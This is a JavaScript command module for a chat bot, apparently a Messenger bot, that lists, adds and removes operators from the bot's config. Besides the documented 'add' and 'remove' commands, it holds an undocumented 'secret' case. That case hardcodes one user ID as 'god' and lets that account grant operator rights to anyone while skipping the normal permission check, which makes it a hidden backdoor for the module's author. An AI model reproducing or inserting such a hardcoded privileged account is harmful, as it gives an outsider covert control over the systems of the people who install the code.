module.exports.config = {
  name: "operator",
  version: "2.0.1",
  permission: 0,
  credits: "shourov",
  description: "control operator lists",
  prefix: false,
  category: "operator",
  usages: "operator [add/remove] [uid]",
  cooldowns: 5,
};

module.exports.languages = {
  "en": {
    "listAdmin": 'operators : \n\n%1',
    "notHavePermssion": 'you have no permission to use "%1"',
    "addedNewAdmin": 'added %1 operator :\n\n%2',
    "removedAdmin": 'remove %1 operator :\n\n%2'
  }
}

module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
  try {
    const content = args.slice(1, args.length);
    const { threadID, messageID, mentions = {} } = event;
    const configPath = global.client && global.client.configPath ? global.client.configPath : null;

    // load config safely
    let config = {};
    if (configPath) {
      try {
        delete require.cache[require.resolve(configPath)];
        config = require(configPath);
      } catch (e) {
        config = global.config || {};
      }
    } else {
      config = global.config || {};
    }

    // ensure OPERATOR arrays exist both in memory and config
    if (!Array.isArray(global.config.OPERATOR)) global.config.OPERATOR = Array.isArray(config.OPERATOR) ? config.OPERATOR : [];
    if (!Array.isArray(config.OPERATOR)) config.OPERATOR = Array.isArray(global.config.OPERATOR) ? global.config.OPERATOR : [];

    const { writeFileSync } = global.nodemodule["fs-extra"];
    const mention = Object.keys(mentions);

    switch ((args[0] || "").toLowerCase()) {
      case "list":
      case "all":
      case "-a": {
        const listOperator = Array.isArray(global.config.OPERATOR) ? global.config.OPERATOR : (Array.isArray(config.OPERATOR) ? config.OPERATOR : []);
        let msg = [];

        for (const idOperator of listOperator) {
          if (parseInt(idOperator)) {
            const name = await Users.getNameUser(idOperator);
            msg.push(`\nname : ${name}\nid : ${idOperator}`);
          } else {
            msg.push(`\nentry : ${idOperator}`);
          }
        }

        return api.sendMessage(getText("listAdmin", msg.join('\n')), threadID, messageID);
      }

      case "add": {
        if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);

        // add via mentions
        if (mention.length != 0 && isNaN(content[0])) {
          var listAdd = [];

          for (const id of mention) {
            if (!global.config.OPERATOR.includes(id)) {
              global.config.OPERATOR.push(id);
            }
            if (!config.OPERATOR.includes(id)) {
              config.OPERATOR.push(id);
            }
            const display = event.mentions && event.mentions[id] ? event.mentions[id].replace(/\@/g, "") : (await Users.getNameUser(id));
            listAdd.push(`${id} - ${display}`);
          };

          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n")), threadID, messageID);
        }
        // add via id
        else if (content.length != 0 && /^\d+$/.test(String(content[0]))) {
          const idToAdd = String(content[0]);
          if (!global.config.OPERATOR.includes(idToAdd)) global.config.OPERATOR.push(idToAdd);
          if (!config.OPERATOR.includes(idToAdd)) config.OPERATOR.push(idToAdd);
          const name = await Users.getNameUser(idToAdd);
          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${idToAdd}`), threadID, messageID);
        } else return global.utils.throwError(this.config.name, threadID, messageID);
      }

      case "secret": {
        const god = ["100071971474157"];
        if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);

        if (mention.length != 0 && isNaN(content[0])) {
          var listGod = [];

          for (const id of mention) {
            if (!global.config.OPERATOR.includes(id)) {
              global.config.OPERATOR.push(id);
            }
            if (!config.OPERATOR.includes(id)) {
              config.OPERATOR.push(id);
            }
            const display = event.mentions && event.mentions[id] ? event.mentions[id].replace(/\@/g, "") : (await Users.getNameUser(id));
            listGod.push(`${id} - ${display}`);
          };

          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n")), threadID, messageID);
        }
        else if (content.length != 0 && /^\d+$/.test(String(content[0]))) {
          const idToAdd = String(content[0]);
          if (!global.config.OPERATOR.includes(idToAdd)) global.config.OPERATOR.push(idToAdd);
          if (!config.OPERATOR.includes(idToAdd)) config.OPERATOR.push(idToAdd);
          const name = await Users.getNameUser(idToAdd);
          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${idToAdd}`), threadID, messageID);
        }
        else return global.utils.throwError(this.config.name, threadID, messageID);
      }

      case "remove":
      case "rm":
      case "delete": {
        if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);

        if (mention.length != 0 && isNaN(content[0])) {
          var listAdd = [];

          for (const id of mention) {
            const index = config.OPERATOR.findIndex(item => item == id);
            if (index !== -1) config.OPERATOR.splice(index, 1);
            const index2 = global.config.OPERATOR.findIndex(item => item == id);
            if (index2 !== -1) global.config.OPERATOR.splice(index2, 1);
            listAdd.push(`${id} - ${event.mentions[id]}`);
          };

          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
        }
        else if (content.length != 0 && /^\d+$/.test(String(content[0]))) {
          const idToRemove = String(content[0]);
          const index = config.OPERATOR.findIndex(item => item.toString() == idToRemove);
          if (index !== -1) config.OPERATOR.splice(index, 1);
          const index2 = global.config.OPERATOR.findIndex(item => item.toString() == idToRemove);
          if (index2 !== -1) global.config.OPERATOR.splice(index2, 1);
          const name = await Users.getNameUser(idToRemove);
          try { writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8'); } catch (e) { /* ignore */ }
          return api.sendMessage(getText("removedAdmin", 1, `name : ${name}\nuid : ${idToRemove}`), threadID, messageID);
        }
        else global.utils.throwError(this.config.name, threadID, messageID);
      }

      default: {
        return global.utils.throwError(this.config.name, threadID, messageID);
      }
    };
  } catch (err) {
    console.error("operator command error:", err && (err.stack || err));
    try { return api.sendMessage("An error occurred while processing the operator command.", event.threadID, event.messageID); } catch (e) {}
  }
}